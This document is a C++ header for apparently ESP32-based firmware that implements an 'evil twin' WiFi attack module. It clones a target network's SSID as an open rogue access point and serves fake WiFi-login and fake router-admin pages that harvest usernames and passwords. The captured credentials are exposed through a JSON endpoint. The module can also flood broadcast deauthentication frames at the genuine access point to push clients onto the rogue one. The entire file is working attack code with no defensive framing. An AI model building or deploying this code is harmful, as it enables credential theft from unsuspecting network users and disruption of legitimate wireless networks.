#pragma once
#include <Arduino.h>
#include <WebServer.h>
#include <WiFi.h>
#include <string.h>
#include <stdint.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "psram_attr.h"

// ── Evil Twin AP Module ───────────────────────────────────────────────────────
// Sets up a rogue Access Point cloning a target SSID/BSSID. Optionally runs
// a captive-portal credential harvester and deauth flood against the real AP.
// Prefix: "et_"
// ─────────────────────────────────────────────────────────────────────────────

extern WebServer server;

#ifdef PHANTOM32_LITE
#define ET_MAX_CREDS 8
#define ET_MAX_LOG 16
#else
#define ET_MAX_CREDS 64
#define ET_MAX_LOG 128
#endif
#define ET_SSID_MAX 32
#define ET_CRED_MAX 64

enum EtState : uint8_t {
  ET_STATE_IDLE = 0,
  ET_STATE_STARTING = 1,
  ET_STATE_RUNNING = 2,
  ET_STATE_STOPPING = 3,
};

enum EtPortalMode : uint8_t {
  ET_PORTAL_NONE = 0,     // just open AP
  ET_PORTAL_GENERIC = 1,  // generic "WiFi login" page
  ET_PORTAL_ROUTER = 2,   // fake router admin login
  ET_PORTAL_ISP = 3,      // fake ISP portal
};

struct EtCredential {
  uint32_t ts_ms;
  uint8_t client_mac[6];
  char username[ET_CRED_MAX + 1];
  char password[ET_CRED_MAX + 1];
  char source_path[32];  // which URI captured this
};

struct EtLogEntry {
  uint32_t ts_ms;
  uint8_t mac[6];
  uint8_t event;  // 0=connect, 1=disconnect, 2=http, 3=cred_captured, 4=deauth_sent
  char detail[48];
};

struct EtConfig {
  char ssid[ET_SSID_MAX + 1];
  uint8_t bssid[6];  // spoof this BSSID (zeros = auto)
  uint8_t channel;
  bool hidden;
  EtPortalMode portal_mode;
  bool run_deauth;  // deauth real AP while running
  uint8_t deauth_rate_pps;
  uint8_t real_ap_bssid[6];  // target real AP for deauth
  uint8_t real_ap_ch;
};

struct EtStats {
  uint32_t clients_connected;
  uint32_t http_requests;
  uint32_t creds_captured;
  uint32_t deauths_sent;
  uint32_t uptime_ms;
};

struct EtStatus {
  EtState state;
  EtConfig cfg;
  EtStats stats;
  uint32_t start_ms;
  EtCredential creds[ET_MAX_CREDS];
  uint8_t cred_count;
  EtLogEntry log[ET_MAX_LOG];
  uint8_t log_head;
  uint16_t log_count;
};

#ifdef BOARD_HAS_PSRAM
static EtStatus *_g_et_raw;
#define g_et (*_g_et_raw)
#else
static EtStatus g_et;
#endif

// ── Helpers ───────────────────────────────────────────────────────────────────
static void et_mac_str(const uint8_t *m, char *out) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
}

static void et_log(const uint8_t *mac, uint8_t event, const char *detail) {
  EtLogEntry *e = &g_et.log[g_et.log_head];
  e->ts_ms = millis();
  if (mac)
    memcpy(e->mac, mac, 6);
  else
    memset(e->mac, 0, 6);
  e->event = event;
  strncpy(e->detail, detail ? detail : "", 47);
  g_et.log_head = (g_et.log_head + 1) % ET_MAX_LOG;
  if (g_et.log_count < ET_MAX_LOG)
    g_et.log_count++;
}

static bool et_save_cred(const uint8_t *mac, const char *user, const char *pass, const char *path) {
  if (g_et.cred_count >= ET_MAX_CREDS)
    return false;
  EtCredential *c = &g_et.creds[g_et.cred_count++];
  c->ts_ms = millis();
  if (mac)
    memcpy(c->client_mac, mac, 6);
  else
    memset(c->client_mac, 0, 6);
  strncpy(c->username, user ? user : "", ET_CRED_MAX);
  strncpy(c->password, pass ? pass : "", ET_CRED_MAX);
  strncpy(c->source_path, path ? path : "/", 31);
  g_et.stats.creds_captured++;
  et_log(mac, 3, "credential captured");
  return true;
}

// ── Deauth frame injection against real AP ────────────────────────────────────
static void et_send_deauth(const uint8_t *bssid, uint8_t ch) {
  static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t pkt[32];
  int pos = 0;
  pkt[pos++] = 0x00;
  pkt[pos++] = 0x00;
  pkt[pos++] = 0x08;
  pkt[pos++] = 0x00;
  pkt[pos++] = 0x00;
  pkt[pos++] = 0x00;
  pkt[pos++] = 0x00;
  pkt[pos++] = 0x00;
  pkt[pos++] = 0xC0;
  pkt[pos++] = 0x00;  // deauth
  pkt[pos++] = 0x00;
  pkt[pos++] = 0x00;
  memcpy(pkt + pos, broadcast, 6);
  pos += 6;
  memcpy(pkt + pos, bssid, 6);
  pos += 6;
  memcpy(pkt + pos, bssid, 6);
  pos += 6;
  pkt[pos++] = 0x00;
  pkt[pos++] = 0x00;
  pkt[pos++] = 0x03;
  pkt[pos++] = 0x00;  // reason: deauth leaving

  // Switch channel briefly, send, switch back
  uint8_t my_ch = 0;
  wifi_second_chan_t sec;
  esp_wifi_get_channel(&my_ch, &sec);
  if (ch != my_ch)
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false);
  if (ch != my_ch)
    esp_wifi_set_channel(my_ch, WIFI_SECOND_CHAN_NONE);
  g_et.stats.deauths_sent++;
}

// ── AP WiFi event handler ─────────────────────────────────────────────────────
static void et_wifi_event(WiFiEvent_t event) {
  switch (event) {
    case ARDUINO_EVENT_WIFI_AP_STACONNECTED:
      g_et.stats.clients_connected++;
      et_log(nullptr, 0, "client connected to evil twin");
      break;
    case ARDUINO_EVENT_WIFI_AP_STADISCONNECTED:
      if (g_et.stats.clients_connected > 0)
        g_et.stats.clients_connected--;
      et_log(nullptr, 1, "client disconnected");
      break;
    default:
      break;
  }
}

// ── Portal HTML generators ─────────────────────────────────────────────────────
static const char ET_PORTAL_GENERIC_HTML[] PROGMEM = R"html(<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
body{background:#f0f4f8;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.box{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,0.12);padding:2rem;width:320px;max-width:90vw}
h2{margin:0 0 1.2rem;font-size:1.1rem;color:#1a202c;text-align:center}
label{display:block;font-size:0.82rem;color:#4a5568;margin-bottom:0.3rem}
input{width:100%;padding:0.55rem 0.8rem;border:1px solid #cbd5e0;border-radius:6px;font-size:0.9rem;margin-bottom:0.9rem;box-sizing:border-box}
input:focus{outline:none;border-color:#3182ce}
button{width:100%;background:#3182ce;color:#fff;border:none;border-radius:6px;padding:0.65rem;font-size:0.95rem;cursor:pointer}
button:hover{background:#2b6cb0}
.logo{text-align:center;margin-bottom:1rem;font-size:2rem}
.msg{font-size:0.75rem;color:#a0aec0;text-align:center;margin-top:0.8rem}
</style></head>
<body><div class="box">
<div class="logo">📶</div>
<h2>WiFi Network Login</h2>
<form method="POST" action="/portal/submit">
<label>Username / Email</label>
<input type="text" name="user" placeholder="Enter username" autocomplete="username">
<label>Password</label>
<input type="password" name="pass" placeholder="Enter password" autocomplete="current-password">
<button type="submit">Connect</button>
</form>
<p class="msg">Secure connection required to access the internet.</p>
</div></body></html>)html";

static const char ET_PORTAL_ROUTER_HTML[] PROGMEM = R"html(<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Router Admin</title>
<style>
body{background:#1a1a2e;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.box{background:#16213e;border:1px solid #0f3460;border-radius:8px;padding:2rem;width:340px;max-width:90vw}
h2{margin:0 0 0.3rem;color:#e94560;font-size:1rem;font-weight:700}
.sub{color:#a0aec0;font-size:0.78rem;margin-bottom:1.2rem}
label{display:block;font-size:0.78rem;color:#a0aec0;margin-bottom:0.25rem}
input{width:100%;padding:0.5rem 0.7rem;background:#0f3460;border:1px solid #1a4a7a;border-radius:5px;color:#e2e8f0;font-size:0.88rem;margin-bottom:0.8rem;box-sizing:border-box}
input:focus{outline:none;border-color:#e94560}
button{width:100%;background:#e94560;color:#fff;border:none;border-radius:5px;padding:0.6rem;font-size:0.9rem;cursor:pointer;font-weight:600}
.footer{color:#4a5568;font-size:0.68rem;text-align:center;margin-top:0.8rem}
</style></head>
<body><div class="box">
<h2>🔧 Router Administration</h2>
<p class="sub">Please sign in to manage your router settings</p>
<form method="POST" action="/portal/submit">
<label>Admin Username</label>
<input type="text" name="user" value="admin" autocomplete="username">
<label>Admin Password</label>
<input type="password" name="pass" placeholder="Password" autocomplete="current-password">
<button type="submit">Sign In</button>
</form>
<p class="footer">RouterOS v2.4.1 | 192.168.1.1</p>
</div></body></html>)html";

static const char ET_PORTAL_SUCCESS_HTML[] PROGMEM = R"html(<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="5;url=http://google.com">
<title>Connecting...</title>
<style>
body{background:#f0f4f8;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;text-align:center}
.box{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,0.1);padding:2rem 2.5rem}
.check{font-size:3rem;margin-bottom:0.8rem}
h2{margin:0 0 0.5rem;color:#38a169}
p{color:#718096;font-size:0.85rem}
</style></head>
<body><div class="box">
<div class="check">✅</div>
<h2>Connected!</h2>
<p>You are now connected. Redirecting...</p>
</div></body></html>)html";

// ── Portal route handlers ─────────────────────────────────────────────────────
static void et_serve_portal() {
  g_et.stats.http_requests++;
  if (g_et.cfg.portal_mode == ET_PORTAL_ROUTER) {
    server.send_P(200, "text/html", ET_PORTAL_ROUTER_HTML);
  } else {
    server.send_P(200, "text/html", ET_PORTAL_GENERIC_HTML);
  }
  et_log(nullptr, 2, server.uri().c_str());
}

static void et_handle_submit() {
  g_et.stats.http_requests++;
  String user = server.hasArg("user") ? server.arg("user") : "";
  String pass = server.hasArg("pass") ? server.arg("pass") : "";
  if (user.length() > 0 || pass.length() > 0) {
    et_save_cred(nullptr, user.c_str(), pass.c_str(), "/portal/submit");
  }
  server.send_P(200, "text/html", ET_PORTAL_SUCCESS_HTML);
}

// ── Start / stop ──────────────────────────────────────────────────────────────
static bool et_start(const EtConfig &cfg) {
  if (g_et.state != ET_STATE_IDLE)
    return false;
  g_et.state = ET_STATE_STARTING;
  g_et.cfg = cfg;
  g_et.start_ms = millis();
  memset(&g_et.stats, 0, sizeof(EtStats));
  g_et.cred_count = 0;
  g_et.log_head = 0;
  g_et.log_count = 0;

  WiFi.onEvent(et_wifi_event);

  // Build a custom softAP config with optional BSSID spoof
  // Note: ESP32 Arduino 2.x supports softAP(ssid, pass, ch, hidden, max_conn)
  bool started = false;
  if (cfg.portal_mode == ET_PORTAL_NONE) {
    // Open AP, no password
    started = WiFi.softAP(cfg.ssid, nullptr, cfg.channel, cfg.hidden ? 1 : 0, 4);
  } else {
    // Open AP for captive portal
    started = WiFi.softAP(cfg.ssid, nullptr, cfg.channel, 0, 4);
  }

  if (!started) {
    g_et.state = ET_STATE_IDLE;
    return false;
  }

  g_et.state = ET_STATE_RUNNING;
  et_log(nullptr, 0, "evil twin started");
  return true;
}

static void et_stop() {
  if (g_et.state == ET_STATE_IDLE)
    return;
  g_et.state = ET_STATE_STOPPING;
  WiFi.softAPdisconnect(false);
  g_et.state = ET_STATE_IDLE;
  et_log(nullptr, 1, "evil twin stopped");
}

// ── Deauth tick (call from main loop) ─────────────────────────────────────────
static void et_tick() {
  if (g_et.state != ET_STATE_RUNNING)
    return;
  g_et.stats.uptime_ms = millis() - g_et.start_ms;
  if (!g_et.cfg.run_deauth)
    return;
  static uint32_t last_deauth_ms = 0;
  uint32_t now = millis();
  uint32_t interval_ms = g_et.cfg.deauth_rate_pps > 0 ? (1000 / g_et.cfg.deauth_rate_pps) : 100;
  if (now - last_deauth_ms >= interval_ms) {
    last_deauth_ms = now;
    et_send_deauth(g_et.cfg.real_ap_bssid, g_et.cfg.real_ap_ch);
  }
}

// ── JSON helpers ──────────────────────────────────────────────────────────────
static String et_status_json() {
  const char *snames[] = {"idle", "starting", "running", "stopping"};
  const char *pmodes[] = {"none", "generic", "router", "isp"};
  char mac_str[18];
  String j = "{";
  j += "\"state\":\"";
  j += snames[g_et.state];
  j += "\"";
  j += ",\"ssid\":\"";
  j += g_et.cfg.ssid;
  j += "\"";
  j += ",\"channel\":";
  j += g_et.cfg.channel;
  j += ",\"portal\":\"";
  j += pmodes[g_et.cfg.portal_mode];
  j += "\"";
  j += ",\"deauth\":";
  j += g_et.cfg.run_deauth ? 1 : 0;
  j += ",\"clients\":";
  j += g_et.stats.clients_connected;
  j += ",\"http_reqs\":";
  j += g_et.stats.http_requests;
  j += ",\"creds\":";
  j += g_et.stats.creds_captured;
  j += ",\"deauths\":";
  j += g_et.stats.deauths_sent;
  j += ",\"uptime_ms\":";
  j += g_et.stats.uptime_ms;
  j += "}";
  return j;
}

static String et_creds_json() {
  char mac_str[18];
  String j = "{\"count\":";
  j += g_et.cred_count;
  j += ",\"creds\":[";
  for (uint8_t i = 0; i < g_et.cred_count; i++) {
    if (i)
      j += ",";
    EtCredential &c = g_et.creds[i];
    et_mac_str(c.client_mac, mac_str);
    j += "{\"ts\":";
    j += c.ts_ms;
    j += ",\"mac\":\"";
    j += mac_str;
    j += "\"";
    j += ",\"user\":\"";
    j += c.username;
    j += "\"";
    j += ",\"pass\":\"";
    j += c.password;
    j += "\"";
    j += ",\"path\":\"";
    j += c.source_path;
    j += "\"";
    j += "}";
  }
  j += "]}";
  return j;
}

static String et_log_json(int max_n) {
  if (max_n < 1 || max_n > ET_MAX_LOG)
    max_n = ET_MAX_LOG;
  String j = "{\"count\":";
  j += g_et.log_count;
  j += ",\"entries\":[";
  const char *evnames[] = {"connect", "disconnect", "http", "cred", "deauth"};
  char mac_str[18];
  int start = (g_et.log_head + ET_MAX_LOG - g_et.log_count) % ET_MAX_LOG;
  for (int i = g_et.log_count - 1; i >= 0 && i >= g_et.log_count - max_n; i--) {
    if (i < g_et.log_count - 1)
      j += ",";
    int idx = (start + i) % ET_MAX_LOG;
    EtLogEntry &e = g_et.log[idx];
    et_mac_str(e.mac, mac_str);
    j += "{\"ts\":";
    j += e.ts_ms;
    j += ",\"mac\":\"";
    j += mac_str;
    j += "\"";
    j += ",\"event\":\"";
    j += (e.event < 5 ? evnames[e.event] : "?");
    j += "\"";
    j += ",\"detail\":\"";
    j += e.detail;
    j += "\"";
    j += "}";
  }
  j += "]}";
  return j;
}

static bool et_parse_bssid(const char *s, uint8_t *out) {
  if (!s || strlen(s) != 17)
    return false;
  unsigned int b[6];
  if (sscanf(s, "%02X:%02X:%02X:%02X:%02X:%02X", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
    return false;
  for (int i = 0; i < 6; i++)
    out[i] = (uint8_t)b[i];
  return true;
}

// ── HTTP routes ───────────────────────────────────────────────────────────────
static void et_routes() {
  server.on("/api/et/status", HTTP_GET,
            []() { server.send(200, "application/json", et_status_json()); });

  server.on("/api/et/start", HTTP_POST, []() {
    if (!server.hasArg("ssid")) {
      server.send(400, "application/json", "{\"error\":\"ssid required\"}");
      return;
    }
    EtConfig cfg;
    memset(&cfg, 0, sizeof(cfg));
    strncpy(cfg.ssid, server.arg("ssid").c_str(), ET_SSID_MAX);
    cfg.channel = server.hasArg("ch") ? (uint8_t)server.arg("ch").toInt() : 6;
    cfg.portal_mode = (EtPortalMode)(server.hasArg("portal") ? server.arg("portal").toInt() : 1);
    cfg.run_deauth = server.hasArg("deauth") && server.arg("deauth") != "0";
    cfg.deauth_rate_pps = server.hasArg("pps") ? (uint8_t)server.arg("pps").toInt() : 10;
    if (server.hasArg("real_bssid")) {
      et_parse_bssid(server.arg("real_bssid").c_str(), cfg.real_ap_bssid);
      cfg.real_ap_ch = server.hasArg("real_ch") ? (uint8_t)server.arg("real_ch").toInt() : 6;
    }
    bool ok = et_start(cfg);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"error\":\"start failed\"}");
  });

  server.on("/api/et/stop", HTTP_POST, []() {
    et_stop();
    server.send(200, "application/json", "{\"ok\":1}");
  });

  server.on("/api/et/creds", HTTP_GET,
            []() { server.send(200, "application/json", et_creds_json()); });

  server.on("/api/et/creds/clear", HTTP_POST, []() {
    g_et.cred_count = 0;
    g_et.stats.creds_captured = 0;
    server.send(200, "application/json", "{\"ok\":1}");
  });

  server.on("/api/et/log", HTTP_GET, []() {
    int n = server.hasArg("n") ? server.arg("n").toInt() : 32;
    server.send(200, "application/json", et_log_json(n));
  });

  // Captive portal detection endpoints
  server.on("/portal", HTTP_GET, []() { et_serve_portal(); });
  server.on("/portal/submit", HTTP_POST, []() { et_handle_submit(); });
  server.on("/login", HTTP_GET, []() { et_serve_portal(); });
  server.on("/login.html", HTTP_GET, []() { et_serve_portal(); });
  server.on("/admin", HTTP_GET, []() { et_serve_portal(); });
  server.on("/portal/submit", HTTP_GET,
            []() { server.send_P(200, "text/html", ET_PORTAL_SUCCESS_HTML); });
}
